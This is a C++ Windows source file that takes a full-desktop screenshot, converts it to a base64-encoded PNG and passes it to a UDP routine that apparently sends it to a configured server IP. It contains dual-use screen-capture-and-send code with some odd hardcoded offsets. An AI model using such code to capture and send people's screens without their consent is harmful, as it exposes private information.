#include "stdafx.h"
#include "Connect.h"

string IP = serverIP;

UDP create;


bool save_png_memory(HBITMAP hbitmap, std::vector<BYTE>& data)
{
	Gdiplus::Bitmap bmp(hbitmap, nullptr);

	//write to IStream
	IStream* istream = nullptr;
	CreateStreamOnHGlobal(NULL, TRUE, &istream);

	CLSID clsid_png;
	CLSIDFromString(L"{557cf406-1a04-11d3-9a73-0000f81ef32e}", &clsid_png);
	Gdiplus::Status status = bmp.Save(istream, &clsid_png);
	if (status != Gdiplus::Status::Ok)
		return false;

	//get memory handle associated with istream
	HGLOBAL hg = NULL;
	GetHGlobalFromStream(istream, &hg);

	//copy IStream to buffer
	int bufsize = GlobalSize(hg);
	data.resize(bufsize);

	//lock & unlock memory
	LPVOID pimage = GlobalLock(hg);
	memcpy(&data[0], pimage, bufsize);
	GlobalUnlock(hg);

	istream->Release();
	return true;
}

void getBitMap(HWND hwnd, int width, int height)
{
	CoInitialize(NULL);

	ULONG_PTR token;
	Gdiplus::GdiplusStartupInput tmp;
	Gdiplus::GdiplusStartup(&token, &tmp, NULL);

	//take screenshot
	auto hdc = GetDC(hwnd);
	auto memdc = CreateCompatibleDC(hdc);
	auto hbitmap = CreateCompatibleBitmap(hdc, width + 385, height+ 218);
	auto oldbmp = SelectObject(memdc, hbitmap);
	StretchBlt(memdc, 0, 0, width + 385, height+ 218, hdc, 0, 0, width + 385, height + 218, SRCCOPY);
	SelectObject(memdc, oldbmp);
	DeleteDC(memdc);
	ReleaseDC(0, hdc);

	//save as png
	Object x;
	std::vector<BYTE> data;
	if (save_png_memory(hbitmap, data))
	{

		string str(data.begin(), data.end());
		string encode = base64_encode(reinterpret_cast<const unsigned char*>(str.c_str()), str.length());
		
		/*std::ofstream fout("output.png", std::ios::binary); 
		fout.write((char*)data.data(), data.size());*/

		create.separator(encode, x);
	
	}
	DeleteObject(hbitmap);

	Gdiplus::GdiplusShutdown(token);
	CoUninitialize();
}

int makeScreen()
{
	RECT lprect;
	HWND hwnd = GetDesktopWindow();
	//HWND hwnd = FindWindowA(NULL, NULL);

	if (hwnd != NULL)
	{
		GetWindowRect(hwnd, &lprect);
		int width = GetDeviceCaps(GetDC(0), HORZRES);
		int height = GetDeviceCaps(GetDC(0), VERTRES);
		SetWindowPos(hwnd, HWND_TOP, 100, 100, 800, 600, NULL);
		MoveWindow(hwnd, 0, 0, 800, 600, FALSE);
		getBitMap(hwnd, width, height);
	}
	else
		cout << "Err";
	return 0;
}



int main()
{
	makeScreen();

	return 0;
}